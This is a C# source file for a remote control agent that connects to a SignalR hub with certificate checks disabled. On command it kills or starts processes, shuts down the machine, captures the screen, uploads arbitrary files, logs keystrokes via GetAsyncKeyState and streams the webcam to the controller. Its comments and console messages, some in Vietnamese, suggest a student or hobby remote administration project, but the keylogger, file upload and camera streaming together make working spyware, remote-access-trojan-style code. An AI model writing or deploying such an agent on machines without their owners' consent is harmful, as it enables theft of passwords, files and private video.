using AForge.Video;
using AForge.Video.DirectShow;
using Microsoft.AspNetCore.SignalR.Client;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text.Json;
using System.Threading.Tasks;

namespace AgentApp
{
    class Program
    {
        // For Keylogger API
        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(int vKey);

        private static bool _isKeylogging = false;
        
        // For Webcam Streaming
        private static VideoCaptureDevice _videoSource;
        private static HubConnection _connection;
        private static bool _firstFrameSent = false;

        static async Task Main(string[] args)
        {
            Console.WriteLine("Starting Remote Control Agent...");
            // Allow passing Hub IP/URL via command line arguments
            var hubUrl = args.Length > 0 ? args[0] : "http://localhost:5000/remoteHub"; 
            Console.WriteLine($"Connecting to {hubUrl}...");

            _connection = new HubConnectionBuilder()
                .WithUrl(hubUrl, options => 
                {
                    options.HttpMessageHandlerFactory = handler =>
                    {
                        if (handler is System.Net.Http.HttpClientHandler clientHandler)
                        {
                            clientHandler.ServerCertificateCustomValidationCallback = (sender, cert, chain, sslPolicyErrors) => true;
                        }
                        return handler;
                    };
                })
                .WithAutomaticReconnect()
                .Build();

            _connection.Closed += async (error) =>
            {
                Console.WriteLine("Connection lost. Reconnecting...");
                await Task.Delay(new Random().Next(0, 5) * 1000);
                await _connection.StartAsync();
            };

            // Register handlers for Hub commands
            _connection.On("GetProcessesCommand", async () => 
            {
                Console.WriteLine("Command Received: GetProcessesCommand");
                try
                {
                    var processes = Process.GetProcesses()
                        .Where(p => p.MainWindowHandle != IntPtr.Zero || p.ProcessName == "explorer")
                        .Select(p => new {
                            Id = p.Id,
                            Name = p.ProcessName,
                            Threads = p.Threads.Count
                        }).ToList();

                    var json = JsonSerializer.Serialize(processes);
                    await _connection.InvokeAsync("SendProcessesResult", "", json);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error getting processes: {ex.Message}");
                }
            });

            _connection.On<int>("KillProcessCommand", (processId) => 
            {
                Console.WriteLine($"Command Received: KillProcessCommand for PID {processId}");
                try
                {
                    var p = Process.GetProcessById(processId);
                    p.Kill();
                    Console.WriteLine($"Process {processId} killed.");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Failed to kill process {processId}: {ex.Message}");
                }
            });

            // --- NEW: Applications Management ---
            _connection.On("GetApplicationsCommand", async () => 
            {
                Console.WriteLine("Command Received: GetApplicationsCommand");
                try
                {
                    // Filter processes that actually have a GUI Window
                    var apps = Process.GetProcesses()
                        .Where(p => p.MainWindowHandle != IntPtr.Zero && !string.IsNullOrEmpty(p.MainWindowTitle))
                        .Select(p => new {
                            Id = p.Id,
                            Name = p.ProcessName,
                            Title = p.MainWindowTitle
                        }).ToList();

                    var json = JsonSerializer.Serialize(apps);
                    await _connection.InvokeAsync("SendApplicationsResult", "", json);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error getting apps: {ex.Message}");
                }
            });

            _connection.On<string>("StartAppCommand", (appPath) => 
            {
                Console.WriteLine($"Command Received: StartAppCommand for {appPath}");
                try
                {
                    Process.Start(new ProcessStartInfo { FileName = appPath, UseShellExecute = true });
                    Console.WriteLine($"Started app: {appPath}");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Failed to start app {appPath}: {ex.Message}");
                }
            });

            // --- NEW: Power Management ---
            _connection.On("ShutdownCommand", () => 
            {
                Console.WriteLine("Command Received: ShutdownCommand");
                try { Process.Start("shutdown.exe", "/s /t 0"); } catch { }
            });

            _connection.On("RestartCommand", () => 
            {
                Console.WriteLine("Command Received: RestartCommand");
                try { Process.Start("shutdown.exe", "/r /t 0"); } catch { }
            });

            // --- NEW: Screen Capture ---
            _connection.On("TakeScreenshotCommand", async () => 
            {
                Console.WriteLine("Command Received: TakeScreenshotCommand");
                try
                {
                    // Create a bitmap of the primary screen bounds
                    // Note: In real app we might want all screens, but primary is good for MVP
                    Rectangle bounds = new Rectangle(0, 0, 1920, 1080); // Default fallback
                    
                    // Use System.Windows.Forms.Screen if available in net8.0-windows, else fallback
                    var screenBounds = System.Windows.Forms.Screen.PrimaryScreen?.Bounds ?? bounds;
                    
                    using (Bitmap bitmap = new Bitmap(screenBounds.Width, screenBounds.Height))
                    {
                        using (Graphics g = Graphics.FromImage(bitmap))
                        {
                            g.CopyFromScreen(Point.Empty, Point.Empty, screenBounds.Size);
                        }
                        
                        using (MemoryStream ms = new MemoryStream())
                        {
                            // Save as JPEG to reduce payload size over SignalR
                            bitmap.Save(ms, ImageFormat.Jpeg);
                            byte[] imageBytes = ms.ToArray();
                            string base64String = Convert.ToBase64String(imageBytes);
                            
                            await _connection.InvokeAsync("SendScreenshotResult", "", base64String);
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error capturing screen: {ex.Message}");
                }
            });

            // --- NEW: File Download ---
            _connection.On<string>("DownloadFileCommand", async (filePath) => 
            {
                Console.WriteLine($"Command Received: DownloadFileCommand for {filePath}");
                try
                {
                    if (File.Exists(filePath))
                    {
                        byte[] fileBytes = await File.ReadAllBytesAsync(filePath);
                        string base64Data = Convert.ToBase64String(fileBytes);
                        string fileName = Path.GetFileName(filePath);
                        await _connection.InvokeAsync("SendFileResult", "", fileName, base64Data);
                        Console.WriteLine("File sent successfully.");
                    }
                    else
                    {
                        Console.WriteLine("File not found.");
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error downloading file: {ex.Message}");
                }
            });

            // --- NEW: Keylogger ---
            _connection.On("StartKeyloggerCommand", () => 
            {
                Console.WriteLine("Command Received: StartKeyloggerCommand");
                if(!_isKeylogging)
                {
                    _isKeylogging = true;
                    // Run a background thread to poll keys
                    Task.Run(async () => {
                        while (_isKeylogging)
                        {
                            for (int i = 8; i <= 255; i++)
                            {
                                int keyState = GetAsyncKeyState(i);
                                // The most significant bit is set if the key is down
                                if ((keyState & 1) == 1 || keyState == -32767) 
                                {
                                    string keyName = ((ConsoleKey)i).ToString();
                                    // Send key immediately 
                                    await _connection.InvokeAsync("SendKeylogData", "", $"[{keyName}]");
                                }
                            }
                            await Task.Delay(10); // Polling interval
                        }
                    });
                }
            });

            _connection.On("StopKeyloggerCommand", () => 
            {
                Console.WriteLine("Command Received: StopKeyloggerCommand");
                _isKeylogging = false;
            });

            // --- NEW: Webcam Stream ---
            _connection.On("StartWebcamCommand", () => 
            {
                Console.WriteLine("Command Received: StartWebcamCommand");
                
                try 
                {
                    FilterInfoCollection videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                    if (videoDevices.Count > 0)
                    {
                        if (_videoSource == null)
                        {
                            var device = videoDevices[0];
                            Console.WriteLine($"Found camera: {device.Name}");
                            _videoSource = new VideoCaptureDevice(device.MonikerString);
                            
                            // Optional: Lower resolution to save bandwidth
                            if (_videoSource.VideoCapabilities.Length > 0)
                            {
                                _videoSource.VideoResolution = _videoSource.VideoCapabilities.OrderBy(v => v.FrameSize.Width).First();
                                Console.WriteLine($"Camera resolution set to: {_videoSource.VideoResolution.FrameSize.Width}x{_videoSource.VideoResolution.FrameSize.Height}");
                            }
                            
                            _videoSource.NewFrame += new NewFrameEventHandler(video_NewFrame);
                            _videoSource.VideoSourceError += new VideoSourceErrorEventHandler(video_VideoSourceError);
                        }

                        if (!_videoSource.IsRunning)
                        {
                            Console.WriteLine("Starting camera...");
                            _firstFrameSent = false;
                            _videoSource.Start();
                            Console.WriteLine("Camera start signal sent. Waiting for frames...");
                        }
                    }
                    else
                    {
                        Console.WriteLine("No webcam devices found on this PC.");
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Exception when starting camera: {ex.Message}");
                }
            });

            _connection.On("StopWebcamCommand", () => 
            {
                Console.WriteLine("Command Received: StopWebcamCommand");
                try 
                {
                    if (_videoSource != null && _videoSource.IsRunning)
                    {
                        Console.WriteLine("Stopping camera...");
                        _videoSource.SignalToStop();
                        // Wait for it to stop
                        _videoSource.WaitForStop();
                        Console.WriteLine("Camera stopped.");
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Exception when stopping camera: {ex.Message}");
                }
            });

            try
            {
                await _connection.StartAsync();
                Console.WriteLine("Connected to Hub successfully!");
                await _connection.InvokeAsync("RegisterAgent", Environment.MachineName);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error starting connection. Is WebApp running? {ex.Message}");
            }

            Console.WriteLine("Agent is running... Press Ctrl+C to exit.");
            await Task.Delay(-1);
            await _connection.StopAsync();
        }

        // Handle frames from webcam and stream over SignalR
        private static void video_NewFrame(object sender, NewFrameEventArgs eventArgs)
        {
            try
            {
                // Clone the bitmap since eventArgs.Frame goes out of scope and is disposed
                using (Bitmap bitmap = (Bitmap)eventArgs.Frame.Clone())
                {
                    using (MemoryStream ms = new MemoryStream())
                    {
                        // Save as JPEG to keep memory small over signalr
                        // Note: Using a low quality parameter requires an EncoderParameter, default Save is fine for now
                        bitmap.Save(ms, ImageFormat.Jpeg);
                        byte[] imageBytes = ms.ToArray();
                        string base64String = Convert.ToBase64String(imageBytes);

                        if (_connection != null && _connection.State == HubConnectionState.Connected)
                        {
                            // Fire and forget so we don't hold up the camera thread
                            _ = _connection.InvokeAsync("SendWebcamFrame", "", base64String);
                            
                            if (!_firstFrameSent)
                            {
                                Console.WriteLine("Thành công! Frame hình ảnh đầu tiên đã được gửi đi. Camera đang stream.");
                                _firstFrameSent = true;
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error sending video frame: " + ex.Message);
            }
        }

        private static void video_VideoSourceError(object sender, VideoSourceErrorEventArgs eventArgs)
        {
            Console.WriteLine($"[CAMERA LỖI] {eventArgs.Description}");
            Console.WriteLine("-> NGUYÊN NHÂN THƯỜNG GẶP: Camera đang bị một phần mềm khác sử dụng (VD: Bạn đang mở sẵn app Camera của Windows, OBS, hoặc Zalo/Zoom). Hãy đóng app đó lại!!");
        }
    }
}
